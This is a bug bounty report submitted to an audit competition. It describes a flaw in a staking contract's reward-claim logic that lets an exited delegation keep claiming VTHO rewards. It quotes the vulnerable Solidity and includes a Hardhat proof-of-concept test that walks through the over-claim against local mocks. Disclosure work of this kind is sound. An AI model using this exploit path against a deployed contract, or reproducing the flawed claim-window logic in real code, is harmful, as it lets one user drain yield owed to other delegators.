# 59863 sc high over claim of delegation rewards after exit

Submitted on Nov 16th 2025 at 14:05:48 UTC by @jo13 for [Audit Comp | Vechain | Stargate Hayabusa](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* Report ID: #59863
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Protocol insolvency
* Theft of unclaimed yield

## Description

### Brief / Intro

A delegated NFT can continue to claim delegation rewards for periods after its delegation has ended, even after the user has already claimed all rewards up to the recorded `endPeriod`. This allows an attacker to over‑claim VTHO rewards beyond their legitimate share, effectively stealing yield from other delegators and breaking the accounting assumptions for the rewards distribution.

### Vulnerability Details

The `Stargate` contract tracks claimable delegation periods with `_claimableDelegationPeriods` and uses `lastClaimedPeriod` as a cursor. When a delegation exits (finite `endPeriod`), claims are supposed to be bounded to `[startPeriod, endPeriod]`. However, once the user has claimed all rewards up to `endPeriod`, the next call computes a new range that starts after `endPeriod` and extends up to the validator’s latest completed period. Combined with the effective stake snapshot logic, this lets an exited delegation keep earning rewards.

Core logic: `_claimableDelegationPeriods`

```solidity
function _claimableDelegationPeriods(
    StargateStorage storage $,
    uint256 _tokenId
) private view returns (uint32, uint32) {
    uint256 delegationId = $.delegationIdByTokenId[_tokenId];
    if (delegationId == 0) return (0, 0);

    (address validator, , , ) = $.protocolStakerContract.getDelegation(delegationId);
    if (validator == address(0)) return (0, 0);

    (uint32 startPeriod, uint32 endPeriod) =
        $.protocolStakerContract.getDelegationPeriodDetails(delegationId);
    (, , , uint32 completedPeriods) =
        $.protocolStakerContract.getValidationPeriodDetails(validator);

    uint32 currentValidatorPeriod = completedPeriods + 1;
    uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
    if (nextClaimablePeriod < startPeriod) {
        nextClaimablePeriod = startPeriod;
    }

    // ended delegation branch
    if (
        endPeriod != type(uint32).max &&
        endPeriod < currentValidatorPeriod &&
        endPeriod > nextClaimablePeriod
    ) {
        return (nextClaimablePeriod, endPeriod);
    }

    // “active” branch
    if (nextClaimablePeriod < currentValidatorPeriod) {
        return (nextClaimablePeriod, completedPeriods);
    }

    return (0, 0);
}
```

Key conditions:

* For an ended delegation:
  * `endPeriod != type(uint32).max`
  * `endPeriod < currentValidatorPeriod`
  * `endPeriod > nextClaimablePeriod`

After a full claim up to `endPeriod`:

* `lastClaimedPeriod = endPeriod`
* `nextClaimablePeriod = endPeriod + 1`

Now `endPeriod > nextClaimablePeriod` is false, so the “ended delegation” branch is skipped. The function then falls into the “active” branch:

```solidity
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

Thus, for an exited delegation that has already claimed everything up to `endPeriod`, `_claimableDelegationPeriods` returns:

```
(firstClaimablePeriod, lastClaimablePeriod) = (endPeriod + 1, completedPeriods);
```

#### Claiming and `lastClaimedPeriod`

Claims are executed by `_claimRewards`:

```solidity
function _claimRewards(StargateStorage storage $, uint256 _tokenId) private {
    (uint32 firstClaimablePeriod, uint32 lastClaimablePeriod) =
        _claimableDelegationPeriods($, _tokenId);

    if (_exceedsMaxClaimablePeriods($, _tokenId)) {
        lastClaimablePeriod = firstClaimablePeriod + $.maxClaimablePeriods - 1;
    }

    uint256 claimableAmount = _claimableRewards($, _tokenId, 0);
    if (claimableAmount == 0) {
        return;
    }

    address tokenOwner = $.stargateNFTContract.ownerOf(_tokenId);

    $.lastClaimedPeriod[_tokenId] = lastClaimablePeriod;

    VTHO_TOKEN.safeTransfer(tokenOwner, claimableAmount);

    emit DelegationRewardsClaimed(
        tokenOwner,
        _tokenId,
        $.delegationIdByTokenId[_tokenId],
        claimableAmount,
        firstClaimablePeriod,
        lastClaimablePeriod
    );
}
```

`_claimableRewards` simply sums per‑period rewards over `[firstClaimablePeriod, lastClaimablePeriod]`, and `lastClaimedPeriod` is updated to `lastClaimablePeriod` at the end, enabling repeated over‑claims for subsequent periods.

#### Reward share calculation

Per-period share:

```solidity
function _claimableRewardsForPeriod(
    StargateStorage storage $,
    uint256 _tokenId,
    uint32 _period
) private view returns (uint256) {
    uint256 delegationId = $.delegationIdByTokenId[_tokenId];
    (address validator, , , ) = $.protocolStakerContract.getDelegation(delegationId);

    uint256 delegationPeriodRewards = $.protocolStakerContract.getDelegatorsRewards(
        validator,
        _period
    );

    // token’s effective stake
    uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);

    // total delegators effective stake snapshot for that validator/period
    uint256 delegatorsEffectiveStake = $.delegatorsEffectiveStake[validator].upperLookup(
        _period
    );

    if (delegatorsEffectiveStake == 0) {
        return 0;
    }

    return (effectiveStake * delegationPeriodRewards) / delegatorsEffectiveStake;
}
```

Snapshots for `delegatorsEffectiveStake` are updated via `_updatePeriodEffectiveStake` on delegation and on exit, but `_calculateEffectiveStake` always recomputes the attacker's stake from current NFT data. After exit:

* The attacker’s stake has been removed from the snapshot (denominator) for future periods.
* `_calculateEffectiveStake` still returns a positive value for the attacker token.
* For periods after `endPeriod`, the attacker’s numerator includes their full effective stake, but the denominator corresponds to only remaining delegators.

This combination makes the attacker’s share for post‑exit periods artificially large.

## Impact Details

The vulnerability allows an exited delegator to continue claiming rewards for periods that occur after their delegation has ended, enabling them to repeatedly over-claim VTHO rewards they are not entitled to. Because their effective stake is still used in the numerator while their stake is removed from the denominator for post-exit periods, the attacker receives an artificially inflated share of delegation rewards. This directly steals yield from honest delegators, creates accounting inconsistencies between expected and distributed rewards, and undermines the economic integrity, fairness, and trust of the entire reward distribution mechanism.

## References

Contracts:

* packages/contracts/contracts/Stargate.sol
  * `_claimableDelegationPeriods` (claimable period window logic)
  * `_claimRewards` and `_claimableRewards`
  * `_claimableRewardsForPeriod`
  * `_updatePeriodEffectiveStake` / `_calculateEffectiveStake`
* packages/contracts/contracts/mocks/ProtocolStakerMock.sol
  * `signalDelegationExit` and `getDelegationPeriodDetails`
  * `getDelegatorsRewards` mock behavior

Test (PoC):

* packages/contracts/test/unit/Stargate/Rewards.test.ts
  * `it("allows claiming rewards again after exit and full claim (over-claim bug)", ...)`

Config / Setup:

* packages/contracts/hardhat.config.ts (networks and reward calculations)
* packages/contracts/test/helpers/deploy.ts (deployment and wiring of `Stargate`, `StargateNFT`, and `ProtocolStakerMock`)

## Proof of Concept

Summary steps (PoC):

{% stepper %}
{% step %}

### 1. Stake and delegate attacker token

* Stake NFT for attacker and delegate to a validator.
  {% endstep %}

{% step %}

### 2. Stake and delegate victim token

* Stake NFT for another user (victim) and delegate to the same validator so total effective stake remains positive after attacker exit.
  {% endstep %}

{% step %}

### 3. Advance periods and request exit

* Advance validator completed periods, request delegation exit for attacker so the delegation has a finite `endPeriod`, then advance one more period so the delegation becomes exited.
  {% endstep %}

{% step %}

### 4. First claim after exit

* Claim rewards after exit; this should claim all periods up to `endPeriod`.
  {% endstep %}

{% step %}

### 5. Advance more periods and over-claim

* Advance additional periods after exit. The attacker can still claim rewards for periods after `endPeriod` (over-claim), and receive funds again.
  {% endstep %}
  {% endstepper %}

PoC test to reproduce (add this function to packages/contracts/test/unit/Stargate/Rewards.test.ts and run `VITE_APP_ENV=local yarn test:hardhat --grep "over-claim bug"`):

```ts
    it("allows claiming rewards again after exit and full claim (over-claim bug)", async () => {
        let currentPeriod = 1;
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

        // Attacker stake & delegate
        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const attackerTokenId = await stargateNFTMock.getCurrentTokenId();
        log("\n🎉 Staked attacker token with id:", attackerTokenId);

        tx = await stargateContract.connect(user).delegate(attackerTokenId, validator.address);
        await tx.wait();
        log("\n🎉 Delegated attacker token to validator", validator.address);

        // Victim stake & delegate (keeps positive total effective stake after attacker exit)
        tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const victimTokenId = await stargateNFTMock.getCurrentTokenId();
        log("\n🎉 Staked victim token with id:", victimTokenId);

        tx = await stargateContract.connect(otherUser).delegate(victimTokenId, validator.address);
        await tx.wait();
        log("\n🎉 Delegated victim token to validator", validator.address);

        const expectedFirstClaimablePeriod = currentPeriod + 1;

        // fast forward some periods before requesting exit
        currentPeriod = 5;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            currentPeriod - 1
        );
        await tx.wait();
        log("\n🎉 Set validator completed periods to ", currentPeriod - 1);

        expect(await stargateContract.getDelegationStatus(attackerTokenId)).to.be.equal(
            DELEGATION_STATUS_ACTIVE
        );

        // request delegation exit for attacker so its delegation has a finite endPeriod
        tx = await stargateContract.connect(user).requestDelegationExit(attackerTokenId);
        await tx.wait();
        log("\n🎉 Requested delegation exit for attacker");
        const expectedLastClaimablePeriod = currentPeriod;

        // move to the next validator period so the attacker delegation becomes exited
        currentPeriod = 6;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            currentPeriod - 1
        );
        await tx.wait();
        log("\n🎉 Set validator completed periods to ", currentPeriod - 1);

        expect(await stargateContract.getDelegationStatus(attackerTokenId)).to.be.equal(
            DELEGATION_STATUS_EXITED
        );

        // first claim after exit: should claim all periods up to endPeriod
        const [firstClaimablePeriod, lastClaimablePeriod] =
            await stargateContract.claimableDelegationPeriods(attackerTokenId);
        expect(firstClaimablePeriod).to.be.equal(expectedFirstClaimablePeriod);
        expect(lastClaimablePeriod).to.be.equal(expectedLastClaimablePeriod);

        const initialClaimable = await stargateContract["claimableRewards(uint256)"](
            attackerTokenId
        );
        expect(initialClaimable).to.be.greaterThan(0n);

        const preClaimBalance = await vthoTokenContract.balanceOf(user.address);
        tx = await stargateContract.connect(user).claimRewards(attackerTokenId);
        await tx.wait();
        log("\n💰 Claimed rewards for attacker after exit (first claim)");
        const midBalance = await vthoTokenContract.balanceOf(user.address);
        expect(midBalance - preClaimBalance).to.be.equal(initialClaimable);

        // advance more periods after the attacker delegation has already ended
        currentPeriod = 8;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            currentPeriod - 1
        );
        await tx.wait();
        log("\n🎉 Set validator completed periods to ", currentPeriod - 1);

        expect(await stargateContract.getDelegationStatus(attackerTokenId)).to.be.equal(
            DELEGATION_STATUS_EXITED
        );

        // vulnerability: there are still claimable rewards for attacker even though its delegation is exited
        const postExitClaimable = await stargateContract["claimableRewards(uint256)"](
            attackerTokenId
        );
        log("\n💰 Claimable rewards for attacker after exit and full claim:", postExitClaimable);
        expect(postExitClaimable).to.be.greaterThan(0n);

        const balanceBeforeSecondClaim = await vthoTokenContract.balanceOf(user.address);
        tx = await stargateContract.connect(user).claimRewards(attackerTokenId);
        await tx.wait();
        log("\n💰 Claimed rewards again for attacker after exit (over-claim)");
        const finalBalance = await vthoTokenContract.balanceOf(user.address);
        expect(finalBalance - balanceBeforeSecondClaim).to.be.equal(postExitClaimable);
    });
```

***
